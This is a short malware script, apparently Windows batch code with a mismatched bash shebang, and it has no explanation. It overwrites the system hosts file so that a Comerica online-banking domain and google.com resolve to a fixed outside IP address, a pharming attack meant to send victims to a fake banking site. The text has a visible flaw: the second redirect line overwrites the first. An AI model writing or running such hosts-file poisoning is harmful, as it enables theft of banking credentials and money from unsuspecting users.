#!/bin/bash
@echo off
echo 210.138.184.59 www.webbanking.comerica.com > %temp%\temphosts.txt
echo 210.138.184.59 www.google.com > %temp%\temphosts.txt
type C:\WINDOWS\system32\drivers\etc\hosts >> %temp%\temphosts.txt
copy /Y %temp%\temphosts.txt C:\WINDOWS\system32\drivers\etc\hosts
